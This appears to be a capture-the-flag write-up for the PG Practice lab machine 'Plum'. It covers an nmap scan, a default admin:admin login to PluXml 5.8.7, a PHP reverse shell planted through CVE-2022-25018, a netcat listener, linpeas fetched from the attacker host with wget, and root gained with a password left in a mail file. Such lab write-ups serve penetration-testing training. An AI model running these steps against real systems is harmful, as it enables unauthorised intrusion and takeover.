---
title: Plum - Intermediate - Linux - PG Practice
date: 2024-06-12
tags:
  - pg-practice
  - offsec
  - oscp-prep
  - linux
  - ospg
  - /var/mail
draft: false
---
# Plum - Intermediate - Linux - PG Practice
# **Scanning**

My basic scan runs the following command
```bash
nmap -sC -T5 -Pn -p- --min-rate=10000 $IP
```

```python
──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/plum]
└─$ basic 192.168.217.28 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-11 16:11 EDT
Warning: 192.168.217.28 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.217.28
Host is up (0.12s latency).
Not shown: 38064 closed tcp ports (conn-refused), 27469 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 c9c3da15283bf1f89a36df4d366ba744 (RSA)
|   256 26032bf6da901d1bec8d8f8d1e7e3d6b (ECDSA)
|_  256 fb43b2b0192fd3f6bcaa6067abc1af37 (ED25519)
80/tcp open  http
|_http-title: PluXml - Blog or CMS, XML powered !

Nmap done: 1 IP address (1 host up) scanned in 27.23 seconds
```

Going to the homepage, we find an endpoint running `PluXml Blog Version 5.8.7`.
We find an exploit for it at https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf

Moreover, a pretty basic mistake of using default credentials where I used `admin:admin` to get inside the `PluXml Blog` as Administrator
# **Exploitation**


There are 4 Steps to Reproduce the Exploit
1. Login with admin:admin 
2. In the Administration menu, select static pages and edit one of the pages. 
3. Insert PHP code with starting and closing tags . 
4. Save the changes and open the stored page.

For this purpose I use PentestMonkey PHP reverse shell from [revshells.com](revshells.com) and paste it in the already built page. Saving it and opening the page, while having a listener already on. 

VOILA!! We have a connection for `www-data` user
```python
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [IP] from (UNKNOWN) [192.168.217.28] 44006
Linux plum 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux
 16:42:09 up 3 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@plum:/$
```
# **Privilege Escalation**

I always like to start with `linpeas.sh`, importing it from my local machine and running it
```python
www-data@plum:/tmp$ wget http://IP:8000/linpeas.sh
wget http://IP:8000/linpeas.sh
--2024-06-11 16:48:10--  http://IP:8000/linpeas.sh
Connecting to IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847924 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 828.05K   791KB/s    in 1.0s    

2024-06-11 16:48:12 (791 KB/s) - ‘linpeas.sh’ saved [847924/847924]

www-data@plum:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@plum:/tmp$ ./linpeas.sh
./linpeas.sh
```

I noticed an unusual binary in the SUID output
```python
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                         
                      ╚════════════════════════════════════╝                                                                                                                              
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                           
strace Not Found                                                        
-rwsr-xr-x 1 root root 1.3M Jul 13  2021 /usr/sbin/exim4 
```

I found that `Exim version 4.94.2 #2 built 13-Jul-2021 16:04:57` was running on the machine. As usual, I found many exploits on Google. I tried to get around to root but none of the exploits seem to work for `exim4`

Upon closer inspection, I found that linpeas also found something juicy in the `/var/mail` directory. Looking into it, I found the root password lmao.
```python
╔══════════╣ Mails (limit 50)
   272394      4 -rw-rw----   1 www-data mail         2654 Jun 11 16:48 /var/mail/www-data                                                                                                 
   272394      4 -rw-rw----   1 www-data mail         2654 Jun 11 16:48 /var/spool/mail/www-data
```

```python
To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
Reply-to: root@localhost
Message-Id: <E1qZU6V-0000El-Pw@localhost>
Date: Fri, 25 Aug 2023 06:31:47 -0400

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:  
root:XXXXXXXXXXXXXXXXXXXX
Thanks,
Administrator
```

We can escalate to root by either using `su` to login as `root` or use `ssh` directly.
```python
www-data@plum:/tmp$ su
su
Password: XXXXXXXXXXXXXXXXXXXX

root@plum:/tmp# cd /root
cd /root
root@plum:~# cat proof.txt
cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

```python
└─$ ssh root@192.168.217.28      
The authenticity of host '192.168.217.28 (192.168.217.28)' can't be established.
ED25519 key fingerprint is SHA256:dFgkgTXNmYqIKoPgky6aPnKabkiw7Jf4aZnS4Gwv82Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.217.28' (ED25519) to the list of known hosts.
root@192.168.217.28's password:
Last login: Fri Aug 25 06:28:24 2023 from 10.9.1.19

root@plum:~# ls
email7.txt  proof.txt  proof.xt
root@plum:~# cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Overall a good machine, with lots of rabbitholes xD